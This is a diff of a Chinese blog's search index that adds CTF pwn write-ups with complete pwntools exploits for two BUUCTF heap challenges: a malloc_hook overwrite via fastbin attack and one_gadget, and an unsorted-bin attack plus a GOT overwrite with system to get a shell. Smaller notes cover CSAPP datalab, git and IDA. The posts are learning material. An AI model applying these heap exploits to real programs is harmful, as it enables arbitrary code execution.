-<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
-<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
-<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
-<p>E = x;</p>
-<p>0 | bios + E | 23个0</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
-<hr>
-<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
-]]></content>
-      <tags>
-        <tag>csapp</tag>
       </tags>
   </entry>
   <entry>
@@ -739,6 +504,158 @@
       </tags>
   </entry>
   <entry>
+    <title>buu刷题笔记</title>
+    <url>/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="vn-pwn-simpleHeap"><a href="#vn-pwn-simpleHeap" class="headerlink" title="vn_pwn_simpleHeap"></a>vn_pwn_simpleHeap</h2><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094648513.png" alt="image-20201120094648513"></p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094808176.png" alt="image-20201120094808176"></p>
+<p>e = 7 + 7</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x10,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094858507.png" alt="image-20201120094858507"></p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094932009.png" alt="image-20201120094932009"></p>
+<p>程序以为只有三个了，因为0xe1把0x71覆盖了，但是0x71还是可以用的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0x18+&#39;\xe1&#39;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095055903.png" alt="image-20201120095055903"></p>
+<p>放入了unsortedbin中</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095130576.png" alt="image-20201120095130576"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095223789.png" alt="image-20201120095223789"></p>
+<p>会把原来unsortedbin中上面的块分走，那么下面里面存放的fd和bk就可以通过原来第二个0x71来输出了。</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095331695.png" alt="image-20201120095331695"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>得到了unsortedbin的链表头，可以得到main_arena的地址和libc的地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main_arena&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget&#x3D;[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget&#x3D;libc_base+libc_one_gadget[1]</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095807801.png" alt="image-20201120095807801"></p>
+<p>变回来了，但是第二个0x71有两个块同时指向chunk2和chunk4</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)#5</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>double free?</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100035193.png" alt="image-20201120100035193"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(4)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>这时候，chunk2和chunk4指向同一个，chunk4被释放了，但是chunk2还在，可以fastbin attack？</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100330055.png" alt="image-20201120100330055"></p>
+<p>修改了fd指针</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100417281.png" alt="image-20201120100417281"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;p64(fake_chunk)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100443552.png" alt="image-20201120100443552"></p>
+<p>申请回来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>然后再申请会到下面这个地址里面，然后因为one_gadget的限制，所以需要利用realloc_hook。</p>
+<p>方法：</p>
+<ol>
+<li><p>realloc填上one_gadget</p>
+</li>
+<li><p>再在malloc上填上对应的realloc调整地址（根据需要减少pop），malloc上面8个就是realloc</p>
+<p>第二部里面的realloc地址是在libc里面的函数地址，，，</p>
+</li>
+</ol>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120161711894.png" alt="image-20201120161711894"></p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120155747244.png" alt="image-20201120155747244"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0xb+p64(one_gadget)+p64(realloc+13)</span><br><span class="line">add(0x60,payload)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm</a></p>
+<hr>
+<p>最后在申请一下，就的到shell了。</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120155844851.png" alt="image-20201120155844851"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size?&#39;)</span><br><span class="line">p.sendline(&quot;12&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26521)</span></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">libc_base=main_arena<span class="number">-0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">fake_chunk=malloc_hook<span class="number">-0x23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"[*]libc_base"</span>+hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么本地打不通，但是远程莫得问题</p>
+<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><h3 id="前期保护"><a href="#前期保护" class="headerlink" title="前期保护"></a>前期保护</h3><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120173551508.png" alt="image-20201120173551508"></p>
+<p>64位的，没有开pie和relro，顿时觉得easy</p>
+<p>没开pie，可以用elf里的plt和got表，没开relro，可以覆盖got表地址。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120173920525.png" alt="image-20201120173920525"></p>
+<p>edit里面可以输入长度，造成堆溢出</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120174112398.png" alt="image-20201120174112398"></p>
+<p>程序留有后面函数，，</p>
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120174142786.png" alt="image-20201120174142786"></p>
+<p>只要v3 == 4869，也就是选择输入的时候输入4869即可。并且让magic大于0x1305可以，unsortedbin可以实现向任意地址读入</p>
+<h3 id="方法一-unsortbin-attack"><a href="#方法一-unsortbin-attack" class="headerlink" title="方法一 unsortbin attack"></a>方法一 unsortbin attack</h3><p>首先申请了三个堆块，其中第二个要大于0x70为unsortbin</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line">add(0x80,&#39;aaaa&#39;)</span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>然后将第二个释放，放入unsortbin中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
+
+<p>利用堆溢出，将unsortbin内容修改，其中fd为任意，bk为目标地址 - 0x10</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line">edit(0,0x20+0x20,&quot;a&quot;*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))</span><br></pre></td></tr></table></figure>
+
+<p>接着，把我们的unsortbin申请回来，实现unsortbin attack</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x80,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>然后，v3输入4869，此时magic已经是一个很大的数，就可以进入后面函数了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&quot;4869&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x06020C0</span></span><br><span class="line"></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>+<span class="number">0x20</span>,<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"4869"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120175326957.png" alt="image-20201120175326957"></p>
+<p>远程有点问题，，，所以要非预期解了。。。</p>
+<h3 id="方法二-fastbin修改got表"><a href="#方法二-fastbin修改got表" class="headerlink" title="方法二 fastbin修改got表"></a>方法二 fastbin修改got表</h3><p>因为后面要申请到的是0x7f，所以刚开始创建0x68的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x68,&#39;aaaa&#39;)#0</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#2</span><br></pre></td></tr></table></figure>
+
+<p>然后释放掉一个块，用上一块块溢出到下一个块，将fd里面填入heaparray[i]附近的内容，再申请回来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x60+p64(0)+p64(0x71)+p64(0x6020ad)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br></pre></td></tr></table></figure>
+
+<p>往申请回来的块里面填入atoi的got表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;b&#39;*35 + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">add(0x68,payload)</span><br></pre></td></tr></table></figure>
+
+<p>然后往got表里面填入system的plt表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; p64(elf.plt[&#39;system&#39;])</span><br><span class="line">edit(0,0x8,payload)</span><br></pre></td></tr></table></figure>
+
+<p>然后发送的时候，发送’/bin/sh’，即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easyheap"</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">35</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>buu刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf常用快捷键</title>
+    <url>/2021/03/05/ctf%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
+    <content><![CDATA[<blockquote>
+<p>碰到好用的在这里记录下来</p>
+</blockquote>
+<ol>
+<li>ida重命名：n</li>
+</ol>
+]]></content>
+      <categories>
+        <category>快捷键</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>embedded(未完成)</title>
     <url>/2020/10/22/embedded/</url>
     <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
@@ -773,6 +690,26 @@
       </tags>
   </entry>
   <entry>
+    <title>git</title>
+    <url>/2021/01/30/git/</url>
+    <content><![CDATA[<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>开源的分布式<strong>版本控制</strong>系统</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
+<li>是分布式的</li>
+<li>内容按原数据方式存储</li>
+<li>没有全局的版本号</li>
+<li>内容的完整性（内容存储使用的是 SHA-1 哈希算法）</li>
+</ol>
+<p><img src="/2021/01/30/git/image-20210130111523672.png" alt="image-20210130111523672"></p>
+<h2 id="git-常用命令"><a href="#git-常用命令" class="headerlink" title="git 常用命令"></a>git 常用命令</h2><p><img src="/2021/01/30/git/gitcommands.jpg" alt="gitcommands"></p>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ida flair</title>
     <url>/2021/03/12/ida-flair/</url>
     <content><![CDATA[<h1 id="ida-flair"><a href="#ida-flair" class="headerlink" title="ida flair"></a>ida flair</h1><blockquote>
@@ -799,6 +736,89 @@
       </categories>
       <tags>
         <tag>flair</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>datalab</title>
+    <url>/2020/07/23/datalab/</url>
+    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
+<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
+<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
+<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
+<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
+<p>太大了，用移位</p>
+<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
+<ul>
+<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
+<li>除了最大值，-1也有同样的情况</li>
+</ul>
+<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
+<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
+<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
+<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
+<p>-x = ~x + 1</p>
+<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
+<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
+<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
+<p>判断x是否非零：!!x</p>
+<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
+<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
+<ul>
+<li>符号相反，如果y为正数，为1</li>
+<li>符号相同，相减 &gt; 0为1</li>
+<li>两数相等（异或实现），返回1</li>
+</ul>
+<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
+<p>正负零的符号位都是0</p>
+<p>取反与1&amp;，正负再&amp;</p>
+<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
+<p>特殊情况</p>
+<ul>
+<li>0 : 1</li>
+<li>1 : 1</li>
+</ul>
+<p>正数：最高位1的位置 + 1（符号位）</p>
+<p>负数：求反码，同正数</p>
+<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
+<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
+<p>特殊情况</p>
+<ul>
+<li>NaN：直接将参数返回回去</li>
+<li>区别规格化数和非规格化数</li>
+</ul>
+<p>单精度浮点内部</p>
